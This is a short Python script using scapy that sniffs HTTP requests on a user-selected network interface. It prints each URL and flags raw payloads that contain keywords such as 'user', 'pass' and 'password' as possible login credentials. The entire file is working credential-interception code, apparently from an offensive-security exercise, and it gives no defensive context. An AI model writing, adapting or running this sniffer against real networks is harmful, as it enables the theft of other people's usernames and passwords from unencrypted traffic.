#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def get_http_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user","User","pass","Pass","Username","Password","password","username"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_http_url(packet)
        print("[+] HTTP Request>> "+url)
        loginInfo = str(get_login_info(packet))
        if loginInfo != "None":
            print("\n\n[*]Possible usename/password>> "+ loginInfo+"\n\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=True, prn=process_sniffed_packet)


intfce = str(raw_input("select interface>>"))
sniff(intfce)
